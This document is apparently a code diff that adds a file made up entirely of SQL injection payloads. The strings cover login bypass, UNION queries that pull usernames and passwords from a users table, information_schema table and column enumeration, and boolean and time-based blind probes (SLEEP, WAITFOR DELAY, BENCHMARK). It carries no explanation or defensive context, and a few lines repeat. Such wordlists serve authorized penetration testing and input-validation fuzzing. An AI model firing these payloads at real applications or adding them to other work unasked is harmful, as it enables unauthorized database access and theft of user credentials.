@@ -1,0 +1,103 @@
+'
+''
+'''
+' OR 1=1 --
+" OR 1=1 --
+' OR 'a'='a
+" OR "a"="a
+') OR ('1'='1
+") OR ("1"="1
+' OR 1=1#
+" OR 1=1#
+' OR 1=1/*
+" OR 1=1/*
+') OR ('1'='1'--
+") OR ("1"="1"--
+' AND 1=2 UNION SELECT 1,2,3--
+" AND 1=2 UNION SELECT 1,2,3--
+' UNION SELECT NULL,NULL,NULL--
+" UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+" UNION ALL SELECT NULL,NULL,NULL--
+1' AND '1'='1
+1" AND "1"="1
+' OR 'a'='a' --
+" OR "a"="a" --
+admin' --
+admin' #
+admin'/*
+admin'-- 
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or 1=1
+admin' or 1=1 --
+admin' or '1'='1'--
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or 1=1
+admin" or 1=1 --
+admin" or "1"="1"--
+' or 1=1; --
+" or 1=1; --
+' OR 1=1#
+" OR 1=1#
+' OR 1=1/*
+" OR 1=1/*
+' OR 1=1;#
+" OR 1=1;#
+' or '1'='1
+" or "1"="1
+' and '1'='1
+" and "1"="1
+'or'1'='1
+"or"1"="1
+'or'1'='1'--
+"or"1"="1"--
+' and 'a'='a
+" and "a"="a
+' and '1'='2
+" and "1"="2
+' UNION SELECT 1,username,password FROM users--
+" UNION SELECT 1,username,password FROM users--
+' UNION SELECT username,password FROM users--
+" UNION SELECT username,password FROM users--
+' UNION SELECT 1,2,3 FROM users--
+" UNION SELECT 1,2,3 FROM users--
+' UNION ALL SELECT username,password FROM users--
+" UNION ALL SELECT username,password FROM users--
+' UNION ALL SELECT 1,2,3 FROM users--
+" UNION ALL SELECT 1,2,3 FROM users--
+' and (select count(*) from users) > 0--
+" and (select count(*) from users) > 0--
+' and ascii(substring((select user()),1,1)) > 64 --
+" and ascii(substring((select user()),1,1)) > 64 --
+' UNION SELECT NULL,NULL,username,password FROM users--
+" UNION SELECT NULL,NULL,username,password FROM users--
+' UNION ALL SELECT NULL,NULL,username,password FROM users--
+" UNION ALL SELECT NULL,NULL,username,password FROM users--
+' UNION SELECT ALL NULL,NULL,username,password FROM users--
+" UNION SELECT ALL NULL,NULL,username,password FROM users--
+admin' or 1=1 limit 1 --
+admin" or 1=1 limit 1 --
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--
+" UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_schema=database()--
+" UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_schema=database()--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+" UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+" UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns--
+" UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns--
+' UNION SELECT NULL,group_concat(username),group_concat(password) FROM users--
+" UNION SELECT NULL,group_concat(username),group_concat(password) FROM users--
+' AND SLEEP(5)--
+" AND SLEEP(5)--
+' OR SLEEP(5)--
+" OR SLEEP(5)--
+' WAITFOR DELAY '0:0:5'--
+" WAITFOR DELAY '0:0:5'--
+' AND BENCHMARK(1000000,MD5(1))--
+" AND BENCHMARK(1000000,MD5(1))--
+' OR BENCHMARK(1000000,MD5(1))--
+" OR BENCHMARK(1000000,MD5(1))--
